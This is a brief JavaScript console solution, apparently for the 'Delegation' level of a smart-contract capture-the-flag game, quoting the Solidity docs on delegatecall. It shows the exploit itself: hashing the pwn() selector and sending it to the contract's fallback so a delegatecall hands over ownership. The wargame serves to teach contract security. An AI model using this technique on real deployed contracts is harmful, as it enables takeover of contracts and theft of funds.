/*
(https://docs.soliditylang.org/en/v0.8.13/introduction-to-smart-contracts.html?#delegatecall-callcode-and-libraries)
From the Solidity docs:

"There exists a special variant of a message call, named delegatecall which is identical to a message 
call apart from the fact that the code at the target address is executed in the context of the 
calling contract and msg.sender and msg.value do not change their values.
This means that a contract can dynamically load code from a different address at runtime. 
Storage, current address and balance still refer to the calling contract, only the code 
is taken from the called address."

Tools needed for this level:
- Console
*/

// Get function signature of the pwn() function we want to execute via delegateCall
const pwnSig = web3.utils.keccak256("pwn()")

// Execute the fallback function of Delegation contract with sendTransaction(),
// passing the signature obtained as the data
await contract.sendTransaction({ data: pwnSig })

// Check if owner has changed
await contract.owner()
